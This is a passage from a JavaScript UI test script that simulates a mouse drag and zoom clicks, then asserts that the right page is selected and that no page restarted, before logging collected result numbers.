  for (let i = 1; i <= 6; i++) await mouse('mouseMoved', {x: handle.x + i * 12, y: handle.y + i * 8}, {buttons: 1});
  await mouse('mouseReleased', {x: handle.x + 72, y: handle.y + 48});
  await sleep(400);
  await personClicks('zoom-in'); await sleep(200); await personClicks('zoom-out'); await sleep(400);
  assert.equal(await active(), ids[3], 'the last press selected its page');
  result.tenBoots = await boots();
  assert.equal(await boots(), 10, 'no page started again');
});

checks.push(['(numbers)', async () => { const {probe, bare, ...rest} = result; console.log('       ' + JSON.stringify(rest).slice(0, 3000)); }]);
await runChecks(checks, shut);
